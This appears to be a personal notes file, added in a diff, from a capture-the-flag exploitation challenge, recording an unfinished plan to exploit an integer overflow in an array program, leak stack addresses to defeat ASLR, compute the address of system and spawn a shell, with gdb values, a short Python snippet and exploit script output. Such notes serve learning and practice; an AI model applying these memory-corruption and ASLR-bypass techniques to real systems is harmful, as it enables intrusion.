@@ -1,0 +1,158 @@
+notes
+
+Exploit with aslr AND non-executable stack
+
+integer overflow 
+	commandArg1 = (int) strtoll(number1String, &resultText, 10);
+
+
+unsigned to signed conversion
+	if (0 < arraySize - position ) { 
+
+this allows us to write to data[-1] == createNewPrevValue
+which we set to a big number, say 7000
+
+then we can call commandNew with 7000
+NOTE: you need to set *createNew == TRUE, this can be done by calling the funciton
+before using the data[-1] trick or by going data[-2] to set the flag to FALSE
+
+Now we have an arraysize of 7000, yay!
+we use this to leak addresses off the stack to find the offset for aslr
+
+Now we know where 'system' is going to be, we can repeditavely use
+the commandSet function to set up main's stack how we like it
+and then finally call EXIT and we'll pop a shell
+
+
+
+BEGIN
+
+help = 0x08048F68
+
+
+Welcome the the array program
+Please type a command or type 'help'
+>> new 5
+This will resize the array to length 5 and clear all data in the array
+To confirm, input command again
+>> set 4294967295 500
+Position -1 set to 500
+>> new 500
+Array cleared
+Resized array to length 500
+
+gdb) p system == 0xf7e463e0
+
+Now I'm going to use the 'show' command to see the 500 thigns on the stack
+I'll be looking for things that are shuffled by aslr
+and I'll try and find something that has a constant offset to system
+
+
+data[388] = 0xf7fdc000
+data[372] = 0xf7fdbbf0
+data[326] = 0xf7feb0f0
+data[314] = 0xf7ff0470
+data[302] = 0xf7fb1000 == 285
+data[296] = 0xf7728c3a
+data[288] = 0xf755fa63
+data[285] = 0xf7fb1000
+
+
+Time to automate things!
+
+
+# these were found to be close to system
+notable_indexes = [326, 314, 302, 296, 288, 285]
+
+for x in notable_indexes:
+	print "{i}:{val}".format(i=x, val=hex(array[x])) ,
+	print array[notable_indexes[0]] - array[x]
+
+
+
+This prints out 
+
+root@kali:~/BrainBox/Dropbox/Programs/Repositories/ctf-challenges/Exploitation/1917/cockatiel# ./exploit.py 
+[+] Started program './run'
+326:0xf77a10f0 0
+314:0xf77a6470 -21376
+302:0xf7767000 237808
+296:0xf77a0c3a 1206
+288:0xf75d7a63 1873549
+285:0xf7767000 237808
+[*] Stopped program './run'
+root@kali:~/BrainBox/Dropbox/Programs/Repositories/ctf-challenges/Exploitation/1917/cockatiel# ./exploit.py 
+[+] Started program './run'
+326:0xf77840f0 0
+314:0xf7789470 -21376
+302:0xf774a000 237808
+296:0xf7783c3a 1206
+288:0xf75baa63 1873549
+285:0xf774a000 237808
+[*] Stopped program './run'
+root@kali:~/BrainBox/Dropbox/Programs/Repositories/ctf-challenges/Exploitation/1917/cockatiel# ./exploit.py 
+[+] Started program './run'
+326:0xf77c70f0 0
+314:0xf77cc470 -21376
+302:0xf778d000 237808
+296:0xf77c6c3a 1206
+288:0xf75fda63 1873549
+285:0xf778d000 237808
+[*] Stopped program './run'
+
+
+
+which means I know that those indexes point to areas in the same aslr slide
+Now I'm going to go in gdb and find the address of system when it runs
+
+
+>>> 0xf775d0f0 - 0xf75b83e0
+1723664
+>>> 0xf77cf0f0 - 0xf762a3e0
+1723664
+
+
+array[326] - 1723664 == system
+woo!
+
+
+exit = 0x8048D28
+
+
+#define NUMBER_LENGTH 8 //should just be under int max
+if (strlen(number2String) <= NUMBER_LENGTH) { //prevent overflow
+
+...
+are you shitting me! omg that's amazingly inconvienint
+I need to put in ~4158940128 which has 10 characters!
+
+ok so I think the way ahead is to use a similar trick to the start
+
+I need to set validNum2 = TRUE
+
+
+nope! I has a solution :)
+
+I can change inputString's pointer to point to eip
+and then the next command I give will over write it!
+
+ahh but I can't put a stack adress in a set command .. damn
+
+
+New plan
+
+I might be able to set the pointer of resultText used in strtoll
+strtoll(number1String, &resultText, 10);
+
+which isn't actually used anywhere, to set higher values
+
+
+
+
+
+
+
+
+
+
+
